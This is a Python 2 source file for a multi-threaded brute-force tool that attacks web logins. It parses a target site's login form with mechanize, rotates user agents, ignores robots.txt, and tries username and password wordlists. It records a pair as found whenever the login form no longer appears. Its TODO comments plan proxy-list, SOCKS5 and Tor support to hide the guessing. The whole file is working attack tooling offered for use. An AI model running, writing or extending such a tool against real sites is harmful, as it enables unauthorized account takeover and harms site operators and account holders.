import actions, utils, sys, mechanize
import threading
from reader import Reader

##################################################################
#
#	TODO:
#		+) Multi threading
#		+) Better form detection logic
#		+) Better automatic login condition - gmail, etc..
#
#	TODO FURTHER
#		+) Proxy support
#		+) auto parse proxy list, brute forcing multi Proxy
#		+) sock 5, tor support
#
##################################################################

class BruteForcing(threading.Thread):
	def __init__(self, optURL, optUsrList, optPassList, pid, listSize):
		###############################################################
		#
		#	@Ic3W4ll
		#
		#	varTargetURL: <protocol>://<domain>/<path>
		#	varUserAgent: UserAgents; random choice from file
		#	frmLoginID: ID of login form, for mechanize.Browser().select_form(nr=ID)
		#	frmUsername: Username form's name, get from parse form
		#	frmPassword: Password form's name, get from parse form
		#	lstUsername: Username list, user's option / wordlist
		#	lstPassword: Passowrd list, user's option / wordlist
		#	szPassword:	Password list's size (number of lines/ words)
		#	fndData: Match usernames + passwords
		#
		################################################################

		threading.Thread.__init__(self)
		self.varTargetURL = optURL
		self.varUserAgent = actions.action_getUserAgent()
		self.frmLoginID = 0
		self.frmUserField = ''
		self.frmPassField = ''
		self.lstUsername = optUsrList
		self.lstPassword = optPassList
		self.fndData = []
		self.isPassFound = False
		self.id = pid
		self.listSize = listSize

		#self.actTestConnection()

	def setOnEachBruteCallback(self, callback):
		self.onEachBruteDone = callback

	def setCallback(self, callback):
		self.callback = callback

	def actTestConnection(self):

		#	Create Browser object
		process = mechanize.Browser()
		process.addheaders = [('User-Agent', self.varUserAgent)]
		process.set_handle_robots(False)

		try:
			process.open(self.varTargetURL)
			#utils.printf("Connected to URL. Gathering login form information...\n", "good")
			self.frmLoginID, self.frmUserField, self.frmPassField = actions.action_getFormInformation(process.forms())
			#utils.printf("Found login form", "good")
			process.close()
			return True

		except TypeError, e:
			utils.printf("Can not find any login form in %s" %(self.varTargetURL), "bad")
			return False

		except mechanize.HTTPError as error:
			utils.printf(error, "bad")
			return False

	def actGetResult(self):
		return self.fndData

	def actTryTargetLogin(self, browserObject, tryUsername, tryPassword, count):
		try:
			#	Fill Login field Information
			browserObject.select_form(nr = self.frmLoginID)
			browserObject.form[self.frmUserField] = tryUsername
			browserObject.form[self.frmPassField] = tryPassword

			#	Print progress bar
			# utils.prints("%10s : %20s%12s%10s / %10s" %(tryUsername, tryPassword, '=' * 6, count, self.szPassword))
			# utils.prints("thread: #%s testing: %s : %s" % (self.id, tryUsername, tryPassword))
			#	Send request
			browserObject.submit()

			#	Refresh page, useful for redirect after login
			browserObject.reload()

			#	If result has no login form  -> Success **NEED IMPROVE**
			#		add login information to fndData, return True

			if not actions.action_getFormInformation(browserObject.forms()):
				# utils.printf("Found: %s:%s" %(tryUsername, tryPassword), "good")
				self.isPassFound = True
				self.fndData.append([tryUsername, tryPassword])
				return True
			return False

		except mechanize.HTTPError as error:
			utils.printf(error, "bad")
			self.callback(self.id, self.actGetResult())
			sys.exit(1)

	def run(self):
		#Start brute forcing
		###############################
		startPoint = (self.id - 1) * self.listSize
		endPoint = startPoint + self.listSize
		# [EDIT HERE] [this doesn't loop]
		lstUsername = Reader(self.lstUsername).read(startPoint, endPoint)
		# [this does loop]
		# lstUsername = Reader(open('userlist.txt')).read(startPoint, endPoint)
		for idxUsername in lstUsername:
			count = 0
			idxUsername = idxUsername.replace('\n', '')
			print idxUsername
			proc = mechanize.Browser()
			proc.addheaders = [('User-Agent', self.varUserAgent)]
			proc.set_handle_robots(False)
			proc.open(self.varTargetURL)

			#######################################
			#	Read password file from start point
			#
			#######################################
			
			for idxPasswd in self.lstPassword:
				idxPasswd = idxPasswd.replace('\n', '')

				count += 1
				if self.actTryTargetLogin(proc, idxUsername, idxPasswd, count):
					break
				else:
					self.onEachBruteDone()
			proc.close()
			self.callback(self.id, self.actGetResult())
		
